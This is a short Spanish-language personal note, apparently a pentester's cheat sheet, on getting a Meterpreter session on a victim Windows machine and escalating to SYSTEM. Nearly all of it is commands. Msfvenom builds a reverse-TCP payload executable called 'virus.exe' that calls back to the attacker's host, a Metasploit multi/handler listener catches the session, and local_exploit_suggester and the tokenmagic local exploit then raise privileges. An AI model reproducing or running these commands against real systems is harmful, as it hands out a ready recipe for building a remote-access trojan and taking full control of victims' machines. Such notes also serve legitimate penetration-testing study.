una vez que tenemos una sesión con meterpreter en la maquina windows victima


```sh fold:"msfvenom para windows"
msfvenom -p windows/meterpreter/reverse_tcp LHOST={IPLOCAL} LPORT={PurtoLocal} -f exe -o virus.exe


# para maquinas de 64 bits
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IPLOCAL} LPORT={PurtoLocal} -f exe -o virus.exe

```

para recibir el meterpreter escuchamos con metasploit con multihandler
use /multihandler
set Lhost ip local
set payload = windows/x64/meterpreter/reverse_tcp
nota: mismo maypload que de msfvenom

run y conseguimos la sesion de meterpreter

```sh fold:"meterpreter"
meterpreter > background
msf exploit(multi/handler) > search local_exploit_suggester

use 0
session -l
# cogemos el id de de sesion
set SESSION {idSesion}
run
# encuntra una lista de exploit que podríamos usar para explotar la escalada de privilegios
# lista en rojo y verde, miramos solo los verdes e iríamos probando uno a uno
use  exploit/windows/local/tokenmagic   # este es el del caso del ejemplo

completamos lo que nos pida en show options
y run
shell
whoami
nt authority/system

```
